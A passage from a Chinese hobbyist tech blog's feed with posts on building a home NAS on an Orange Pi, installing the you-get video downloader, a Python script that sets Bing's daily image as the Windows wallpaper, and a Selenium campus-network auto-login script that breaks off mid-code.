      <url>/2022/09/11/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E8%87%AA%E5%BB%BANAS%E7%B3%BB%E5%88%97%EF%BC%88001%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h4 id="什么是NAS？"><a href="#什么是NAS？" class="headerlink" title="什么是NAS？"></a>什么是NAS？</h4><ul><li><p>以下内容摘取自百度百科：<br>NAS（Network Attached Storage：网络附属存储）按字面简单说就是连接在网络上，具备资料存储功能的装置，因此也称为“网络存储器”。它是一种专用数据存储服务器。它以数据为中心，将存储设备与服务器彻底分离，集中管理数据，从而释放带宽、提高性能、降低总拥有成本、保护投资。其成本远远低于使用服务器存储，而效率却远远高于后者。国际著名的NAS企业有Netapp、EMC、OUO等。</p></li><li><p>以上是NAS的官方定义，而简单来讲，你可以理解为建立在网络上面的一个U盘。也就是说只要有网络，就能实现对文件的实时访问，并且和其他公共网盘完全隔离，数据完全是自己的。</p></li><li><p>著名的NAS提供商有：绿联、群晖等，优点是省心好用，甚至能用来当服务器，缺点嘛，就是“贵”。像我这种穷Ｂ是绝对用不起的，但是为了不愧对我“折腾王”的风格，我索性决定了，自己搭一个，反正又不是不能用！</p></li></ul><h4 id="需要准备的东西"><a href="#需要准备的东西" class="headerlink" title="需要准备的东西"></a>需要准备的东西</h4><ul><li>由于NAS是24小时运行的，所以必然需要考虑电费的问题。当然如果是土豪的话那就请忽略这部分考虑。<br>出于对架构的选择，显然arm架构的处理器的能耗肯定是低于x86架构的。所以我就想到了前段时间买过来但是一直在吃灰的orangepi，你可能会问，为什么要用国产的开发板呢，为什么不用树莓派呢？问得好，因为树莓派贵！</li><li>具体准备的东西如下：<br>香橙派3(LTS)、能上网的电脑、副屏以及HDMI转接线、MiroSD卡、大容量的U盘或者移动硬盘（这里以thinkplus128G为例）、读卡器</li></ul><h4 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h4><ul><li>首先是根据开发板的手册，进行下载镜像和烧录系统等操作，具体就不过多叙述了，可以参照：-&gt;<a href="https://pan.baidu.com/s/16kMcxo_uUO0yCPSpVibjWQ#list/path=%2F">点击这里</a>&lt;-这个链接，自行安装，密码是g4xe。 </li></ul><hr><ul><li>烧录镜像之后呢我们就可以开始部署相关的环境了。<br>首先是更新我们的root用户密码。输入sudo passwd, 输入默认的密码”orangepi”,然后输入和确认新的root密码,接着我们就能登录到root账户了。<hr></li><li>然后连接我们的WiFi。<br>香橙派内置了很友好的界面，可以给我们半图像化的界面来连接wifi，我们输入mntui,选择 Activate a connection,连接WiFi。之后我们ifconfig,查看IP地址，那么这时候我们就能用电脑的ssh客户端连接到我们的orangepi了。<img src="/2022/09/11/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E8%87%AA%E5%BB%BANAS%E7%B3%BB%E5%88%97%EF%BC%88001%EF%BC%89/uTools_1663071420321.png" class="lazyload placeholder" data-srcset="/2022/09/11/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E8%87%AA%E5%BB%BANAS%E7%B3%BB%E5%88%97%EF%BC%88001%EF%BC%89/uTools_1663071420321.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="连接WiFi"><img src="/2022/09/11/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E8%87%AA%E5%BB%BANAS%E7%B3%BB%E5%88%97%EF%BC%88001%EF%BC%89/uTools_1663071547412.png" class="lazyload placeholder" data-srcset="/2022/09/11/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E8%87%AA%E5%BB%BANAS%E7%B3%BB%E5%88%97%EF%BC%88001%EF%BC%89/uTools_1663071547412.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="查看IP地址"><hr></li><li>接着更新一下系统：<code>apt-get update &amp;&amp; apt upgrade</code><img src="/2022/09/11/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E8%87%AA%E5%BB%BANAS%E7%B3%BB%E5%88%97%EF%BC%88001%EF%BC%89/uTools_1663072694003.png" class="lazyload placeholder" data-srcset="/2022/09/11/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E8%87%AA%E5%BB%BANAS%E7%B3%BB%E5%88%97%EF%BC%88001%EF%BC%89/uTools_1663072694003.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="更新系统">到这里环境就部署完成了，下一篇教程我们讲开始着手搭建网盘。</li></ul>]]></content>
      
      
      <categories>
          
          <category> NAS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Samba </tag>
            
            <tag> Frp </tag>
            
            <tag> Debian </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>You-get插件，下载流媒体</title>
      <link href="/2022/09/06/You-get%E6%8F%92%E4%BB%B6%EF%BC%8C%E4%B8%8B%E8%BD%BD%E6%B5%81%E5%AA%92%E4%BD%93/"/>
      <url>/2022/09/06/You-get%E6%8F%92%E4%BB%B6%EF%BC%8C%E4%B8%8B%E8%BD%BD%E6%B5%81%E5%AA%92%E4%BD%93/</url>
      
        <content type="html"><![CDATA[<h3 id="分享：You-get——python下的下载利器"><a href="#分享：You-get——python下的下载利器" class="headerlink" title="分享：You-get——python下的下载利器"></a>分享：You-get——python下的下载利器</h3><ul><li>you-get是一个基于python3环境下的神奇的插件，可以用来自动解析并且下载主流的视频网站的视频，且支持自动转码</li></ul><h3 id="you-get能够做什么"><a href="#you-get能够做什么" class="headerlink" title="you-get能够做什么"></a>you-get能够做什么</h3><ul><li>自动解析网页中包含的视频资源</li><li>自动获取多种格式以及多种清晰度的视频资源</li><li>可以根据选择来下载某类型的视频</li><li>某些网站还支持弹幕的打包下载</li></ul><h3 id="如何安装you-get"><a href="#如何安装you-get" class="headerlink" title="如何安装you-get"></a>如何安装you-get</h3><ul><li><p>安装部署python3环境，具体如何部署参见我的前几篇博客：<a href="https://www.littlewith.tk/2022/08/17/%E4%BD%BF%E7%94%A8python%E4%B8%8B%E8%BD%BD%E6%B5%81%E5%AA%92%E4%BD%93/#%E5%AE%89%E8%A3%85python%E4%BB%A5%E5%8F%8A%E5%AF%B9%E5%BA%94%E7%9A%84%E6%A8%A1%E5%9D%97">点击这里</a></p></li><li><p>使用<kbd>windows</kbd>+<kbd>R</kbd>按键打开运行窗口，并且输入cmd</p><img src="/2022/09/06/You-get%E6%8F%92%E4%BB%B6%EF%BC%8C%E4%B8%8B%E8%BD%BD%E6%B5%81%E5%AA%92%E4%BD%93/1.png" class="lazyload placeholder" data-srcset="/2022/09/06/You-get%E6%8F%92%E4%BB%B6%EF%BC%8C%E4%B8%8B%E8%BD%BD%E6%B5%81%E5%AA%92%E4%BD%93/1.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="step1"></li><li><p>输入<code>pip3 install you-get</code>,等待进度条跑完</p></li></ul><img src="/2022/09/06/You-get%E6%8F%92%E4%BB%B6%EF%BC%8C%E4%B8%8B%E8%BD%BD%E6%B5%81%E5%AA%92%E4%BD%93/2.png" class="lazyload placeholder" data-srcset="/2022/09/06/You-get%E6%8F%92%E4%BB%B6%EF%BC%8C%E4%B8%8B%E8%BD%BD%E6%B5%81%E5%AA%92%E4%BD%93/2.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="step2"><ul><li>当提示安装完成的时候，就表示安装成功了<img src="/2022/09/06/You-get%E6%8F%92%E4%BB%B6%EF%BC%8C%E4%B8%8B%E8%BD%BD%E6%B5%81%E5%AA%92%E4%BD%93/3.png" class="lazyload placeholder" data-srcset="/2022/09/06/You-get%E6%8F%92%E4%BB%B6%EF%BC%8C%E4%B8%8B%E8%BD%BD%E6%B5%81%E5%AA%92%E4%BD%93/3.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="step3"></li></ul><h3 id="如何使用you-get"><a href="#如何使用you-get" class="headerlink" title="如何使用you-get"></a>如何使用you-get</h3><ul><li>打开我们喜欢的视频网站，选择我们自己喜欢的视频，并且复制网址<img src="/2022/09/06/You-get%E6%8F%92%E4%BB%B6%EF%BC%8C%E4%B8%8B%E8%BD%BD%E6%B5%81%E5%AA%92%E4%BD%93/6.png" class="lazyload placeholder" data-srcset="/2022/09/06/You-get%E6%8F%92%E4%BB%B6%EF%BC%8C%E4%B8%8B%E8%BD%BD%E6%B5%81%E5%AA%92%E4%BD%93/6.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="step4"></li><li>再次开启cmd窗口，输入<code>you-get -i + [我们刚刚复制的url]</code><img src="/2022/09/06/You-get%E6%8F%92%E4%BB%B6%EF%BC%8C%E4%B8%8B%E8%BD%BD%E6%B5%81%E5%AA%92%E4%BD%93/8.png" class="lazyload placeholder" data-srcset="/2022/09/06/You-get%E6%8F%92%E4%BB%B6%EF%BC%8C%E4%B8%8B%E8%BD%BD%E6%B5%81%E5%AA%92%E4%BD%93/8.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="step5"></li><li>此时插件会自动去解析我们复制的地址的视频信息，等待片刻后，就会显示出我们的视频信息<img src="/2022/09/06/You-get%E6%8F%92%E4%BB%B6%EF%BC%8C%E4%B8%8B%E8%BD%BD%E6%B5%81%E5%AA%92%E4%BD%93/4.png" class="lazyload placeholder" data-srcset="/2022/09/06/You-get%E6%8F%92%E4%BB%B6%EF%BC%8C%E4%B8%8B%E8%BD%BD%E6%B5%81%E5%AA%92%E4%BD%93/4.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="step6"></li><li>我们根据提示输入我们需要下载的清晰度即可完成下载，可能还会包含弹幕文件<img src="/2022/09/06/You-get%E6%8F%92%E4%BB%B6%EF%BC%8C%E4%B8%8B%E8%BD%BD%E6%B5%81%E5%AA%92%E4%BD%93/5.png" class="lazyload placeholder" data-srcset="/2022/09/06/You-get%E6%8F%92%E4%BB%B6%EF%BC%8C%E4%B8%8B%E8%BD%BD%E6%B5%81%E5%AA%92%E4%BD%93/5.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="step7"></li></ul><h3 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h3><ul><li>关于今天的插件分享就到这里咯，欢迎大家多多支持，我会继续分享给大家好用的东西的。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Python Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 插件 </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BingWallpaper</title>
      <link href="/2022/08/31/%E4%B8%80%E4%B8%AA%E8%87%AA%E5%8A%A8%E8%8E%B7%E5%8F%96%E5%BF%85%E5%BA%94%E5%A3%81%E7%BA%B8%E7%9A%84%E6%8F%92%E4%BB%B6/"/>
      <url>/2022/08/31/%E4%B8%80%E4%B8%AA%E8%87%AA%E5%8A%A8%E8%8E%B7%E5%8F%96%E5%BF%85%E5%BA%94%E5%A3%81%E7%BA%B8%E7%9A%84%E6%8F%92%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h3 id="一键获取bing图片并设为自己的壁纸"><a href="#一键获取bing图片并设为自己的壁纸" class="headerlink" title="一键获取bing图片并设为自己的壁纸"></a>一键获取bing图片并设为自己的壁纸</h3><ul><li>前几天由于疫情封校，实在是闲的没事，所以打算写一个插件玩玩。正好浏览网页的时候又看到了bing的主页图片，于是我便心生一计：把bing的每日壁纸设为自己的桌面</li><li>软件的下载地址为：<a href="https://www.littlewith.tk/download/">https://www.littlewith.tk/download/</a></li></ul><h3 id="原理如下："><a href="#原理如下：" class="headerlink" title="原理如下："></a>原理如下：</h3><ul><li>bing的每日壁纸的信息是通过接口实现的，接口的网址为：<a href="https://cn.bing.com/HPImageArchive.aspx?format=js&amp;idx=0&amp;n=1">https://cn.bing.com/HPImageArchive.aspx?format=js&amp;idx=0&amp;n=1</a></li><li>接口传输的是json数据，那么通过python的json模块就可以很轻松的转化为字典，并且抓到内部的关键信息</li><li>requests模块能够获取到json数据的内容</li><li>wget模块能下载到每日的壁纸</li><li>win32api这个接口可以修改注册表从而达到更换壁纸的目的</li></ul><h3 id="出现的问题以及解决方案"><a href="#出现的问题以及解决方案" class="headerlink" title="出现的问题以及解决方案"></a>出现的问题以及解决方案</h3><ul><li>通过上述思路写出的代码存在几个BUG：<br>  1.wget和requests默认在程序开启时就请求，那么如果这时候没有网络的话，就会直接抛出异常<br>  2.直接通过requests请求时由于过快，会导致偶尔请求不到的情况</li><li>解决问题的方案：<br>  1.建立一个循环机制，只有当判断网络通畅的情况下才进行下载和请求<br>  2.导入time模块，让其sleep几秒之后进行加载</li></ul><h3 id="最终实现的代码如下："><a href="#最终实现的代码如下：" class="headerlink" title="最终实现的代码如下："></a>最终实现的代码如下：</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> wget<span class="token keyword">import</span> json<span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">import</span> win32api<span class="token punctuation">,</span>win32con<span class="token punctuation">,</span>win32gui<span class="token keyword">import</span> os<span class="token keyword">def</span> <span class="token function">getjson</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> <span class="token string">"https://cn.bing.com/HPImageArchive.aspx?format=js&amp;idx=0&amp;n=1"</span>    headers <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">"User-Agent"</span><span class="token punctuation">:</span><span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"</span>    <span class="token punctuation">}</span>    resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>    htmldoc <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>resp<span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    finaurl <span class="token operator">=</span> <span class="token string">'https://www.bing.com'</span> <span class="token operator">+</span> htmldoc<span class="token punctuation">[</span><span class="token string">'images'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> finaurl<span class="token keyword">def</span> <span class="token function">set_wallpaper</span><span class="token punctuation">(</span>img_path<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 打开指定注册表路径</span>    reg_key <span class="token operator">=</span> win32api<span class="token punctuation">.</span>RegOpenKeyEx<span class="token punctuation">(</span>win32con<span class="token punctuation">.</span>HKEY_CURRENT_USER<span class="token punctuation">,</span> <span class="token string">"Control Panel\\Desktop"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> win32con<span class="token punctuation">.</span>KEY_SET_VALUE<span class="token punctuation">)</span>    <span class="token comment"># 最后的参数:2拉伸,0居中,6适应,10填充,0平铺</span>    win32api<span class="token punctuation">.</span>RegSetValueEx<span class="token punctuation">(</span>reg_key<span class="token punctuation">,</span> <span class="token string">"WallpaperStyle"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> win32con<span class="token punctuation">.</span>REG_SZ<span class="token punctuation">,</span> <span class="token string">"10"</span><span class="token punctuation">)</span>    <span class="token comment"># 最后的参数:1表示平铺,拉伸居中等都是0</span>    win32api<span class="token punctuation">.</span>RegSetValueEx<span class="token punctuation">(</span>reg_key<span class="token punctuation">,</span> <span class="token string">"TileWallpaper"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> win32con<span class="token punctuation">.</span>REG_SZ<span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>    <span class="token comment"># 刷新桌面与设置壁纸</span>    win32gui<span class="token punctuation">.</span>SystemParametersInfo<span class="token punctuation">(</span>win32con<span class="token punctuation">.</span>SPI_SETDESKWALLPAPER<span class="token punctuation">,</span> img_path<span class="token punctuation">,</span> win32con<span class="token punctuation">.</span>SPIF_SENDWININICHANGE<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">downpic</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> url    nowtime <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>    nowtime <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>nowtime<span class="token punctuation">)</span>    nowtime <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>nowtime<span class="token punctuation">)</span>    wget<span class="token punctuation">.</span>download<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>out<span class="token operator">=</span><span class="token string">'./'</span><span class="token operator">+</span>nowtime<span class="token operator">+</span><span class="token string">'.jpg'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> nowtime<span class="token operator">+</span><span class="token string">'.jpg'</span><span class="token keyword">def</span> <span class="token function">getfile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token builtin">file</span> <span class="token operator">=</span> os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span>    filestr <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\\'</span><span class="token punctuation">)</span>    finafile <span class="token operator">=</span> filestr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>filestr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        finafile <span class="token operator">=</span> finafile <span class="token operator">+</span><span class="token string">"/"</span><span class="token operator">+</span> filestr<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    filelis <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    filelis<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span>    filelis<span class="token punctuation">.</span>append<span class="token punctuation">(</span>finafile<span class="token punctuation">)</span>    <span class="token keyword">return</span> filelis    <span class="token keyword">pass</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    webstatus <span class="token operator">=</span> os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"ping -n 1 -l 8 baidu.com"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token keyword">not</span><span class="token punctuation">(</span><span class="token string">"的回复: 字节=8"</span> <span class="token keyword">in</span> webstatus<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>        webstatus <span class="token operator">=</span> os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"ping -n 1 -l 8 baidu.com"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    startchg<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">startchg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    picurl <span class="token operator">=</span> getjson<span class="token punctuation">(</span><span class="token punctuation">)</span>    filename <span class="token operator">=</span> downpic<span class="token punctuation">(</span>picurl<span class="token punctuation">)</span>    finafile <span class="token operator">=</span> getfile<span class="token punctuation">(</span><span class="token punctuation">)</span>    finapic <span class="token operator">=</span> finafile<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"\\"</span><span class="token operator">+</span>filename    delfile <span class="token operator">=</span> finafile<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>delfile<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>finapic<span class="token punctuation">)</span>    set_wallpaper<span class="token punctuation">(</span>finapic<span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>    os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0</span>    <span class="token keyword">pass</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> python humansimular </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用python实现校园网的自动登录</title>
      <link href="/2022/08/26/%E4%BD%BF%E7%94%A8python%E5%AE%9E%E7%8E%B0%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%9A%84%E8%87%AA%E5%8A%A8%E7%99%BB%E5%BD%95/"/>
      <url>/2022/08/26/%E4%BD%BF%E7%94%A8python%E5%AE%9E%E7%8E%B0%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%9A%84%E8%87%AA%E5%8A%A8%E7%99%BB%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h4 id="使用python实现校园网的自动登录"><a href="#使用python实现校园网的自动登录" class="headerlink" title="使用python实现校园网的自动登录"></a>使用python实现校园网的自动登录</h4><p>南信大的校园网登录一直是令人头疼的问题，每次开机都要等待浏览器弹出登录页面，输入用户名和密码，点击连接。此过程多多少少都会占用我们的时间，尤其是等我们急着拿电脑传文件的情况下，特别难受。于是我就想到了能否拿python实现校园网的自动连接呢，of course yes!</p><h4 id="github项目地址："><a href="#github项目地址：" class="headerlink" title="github项目地址："></a>github项目地址：</h4><ul><li><a href="https://github.com/littlewith/iNuist_auto_login">https://github.com/littlewith/iNuist_auto_login</a></li></ul><h4 id="github发布地址："><a href="#github发布地址：" class="headerlink" title="github发布地址："></a>github发布地址：</h4><ul><li><a href="https://github.com/littlewith/iNuist_auto_login/releases">https://github.com/littlewith/iNuist_auto_login/releases</a></li></ul><h4 id="模块介绍："><a href="#模块介绍：" class="headerlink" title="模块介绍："></a>模块介绍：</h4><ul><li>本程序用到了下列模块：</li><li>selenium（模拟对浏览器的操作）、time（设置超时，防止网页没有加载完全）、os（系统模块，验证网络是否已连接）、win32api（弹窗与用户进行交互）</li><li>此外，本程序还使用了Google的开源项目Chronium</li></ul><h4 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h4><ul><li>点击上面的发布地址进入我的GitHub发布页，点击下载文件包<img src="/2022/08/26/%E4%BD%BF%E7%94%A8python%E5%AE%9E%E7%8E%B0%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%9A%84%E8%87%AA%E5%8A%A8%E7%99%BB%E5%BD%95/1.png" class="lazyload placeholder" data-srcset="/2022/08/26/%E4%BD%BF%E7%94%A8python%E5%AE%9E%E7%8E%B0%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%9A%84%E8%87%AA%E5%8A%A8%E7%99%BB%E5%BD%95/1.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="step1"></li><li>解压文件<img src="/2022/08/26/%E4%BD%BF%E7%94%A8python%E5%AE%9E%E7%8E%B0%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%9A%84%E8%87%AA%E5%8A%A8%E7%99%BB%E5%BD%95/2.png" class="lazyload placeholder" data-srcset="/2022/08/26/%E4%BD%BF%E7%94%A8python%E5%AE%9E%E7%8E%B0%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%9A%84%E8%87%AA%E5%8A%A8%E7%99%BB%E5%BD%95/2.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="step2"></li><li>把chronium文件夹拖入到F盘的根目录底下<img src="/2022/08/26/%E4%BD%BF%E7%94%A8python%E5%AE%9E%E7%8E%B0%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%9A%84%E8%87%AA%E5%8A%A8%E7%99%BB%E5%BD%95/3.png" class="lazyload placeholder" data-srcset="/2022/08/26/%E4%BD%BF%E7%94%A8python%E5%AE%9E%E7%8E%B0%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%9A%84%E8%87%AA%E5%8A%A8%E7%99%BB%E5%BD%95/3.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="step3"></li><li>进入另一个文件夹，把主程序的快捷方式发送到桌面<img src="/2022/08/26/%E4%BD%BF%E7%94%A8python%E5%AE%9E%E7%8E%B0%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%9A%84%E8%87%AA%E5%8A%A8%E7%99%BB%E5%BD%95/4.png" class="lazyload placeholder" data-srcset="/2022/08/26/%E4%BD%BF%E7%94%A8python%E5%AE%9E%E7%8E%B0%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%9A%84%E8%87%AA%E5%8A%A8%E7%99%BB%E5%BD%95/4.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="step4"></li><li>按下win + R 输入shell:startup<img src="/2022/08/26/%E4%BD%BF%E7%94%A8python%E5%AE%9E%E7%8E%B0%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%9A%84%E8%87%AA%E5%8A%A8%E7%99%BB%E5%BD%95/5.png" class="lazyload placeholder" data-srcset="/2022/08/26/%E4%BD%BF%E7%94%A8python%E5%AE%9E%E7%8E%B0%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%9A%84%E8%87%AA%E5%8A%A8%E7%99%BB%E5%BD%95/5.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="step5"></li><li>把桌面上的快捷方式拖到弹出的启动文件夹内<img src="/2022/08/26/%E4%BD%BF%E7%94%A8python%E5%AE%9E%E7%8E%B0%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%9A%84%E8%87%AA%E5%8A%A8%E7%99%BB%E5%BD%95/6.png" class="lazyload placeholder" data-srcset="/2022/08/26/%E4%BD%BF%E7%94%A8python%E5%AE%9E%E7%8E%B0%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%9A%84%E8%87%AA%E5%8A%A8%E7%99%BB%E5%BD%95/6.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="step6"></li><li>重启电脑</li></ul><h4 id="程序源码："><a href="#程序源码：" class="headerlink" title="程序源码："></a>程序源码：</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> time<span class="token keyword">from</span> selenium <span class="token keyword">import</span> webdriver<span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver<span class="token punctuation">.</span>common<span class="token punctuation">.</span>by <span class="token keyword">import</span> By<span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver<span class="token punctuation">.</span>chrome<span class="token punctuation">.</span>service <span class="token keyword">import</span> Service<span class="token keyword">import</span> os<span class="token keyword">import</span> win32con<span class="token punctuation">,</span>win32api<span class="token keyword">def</span> <span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> <span class="token string">"http://10.255.255.34/authentication"</span>    <span class="token comment"># 调用指定位置的chrome</span>    options <span class="token operator">=</span> webdriver<span class="token punctuation">.</span>ChromeOptions<span class="token punctuation">(</span><span class="token punctuation">)</span>    options<span class="token punctuation">.</span>headless <span class="token operator">=</span> <span class="token boolean">True</span>    <span class="token comment"># chrome的主程序位置</span>    location <span class="token operator">=</span> <span class="token string">r"F:\chronium\chrome-win\chrome.exe"</span>    <span class="token comment"># 在options增加读取的位置</span>    options<span class="token punctuation">.</span>binary_location <span class="token operator">=</span> location    <span class="token comment"># 指定chromedriver的路径</span>    service <span class="token operator">=</span> Service<span class="token punctuation">(</span><span class="token string">r"F:\chronium\chromedriver.exe"</span><span class="token punctuation">)</span>    <span class="token comment"># 开启浏览器</span>    new <span class="token 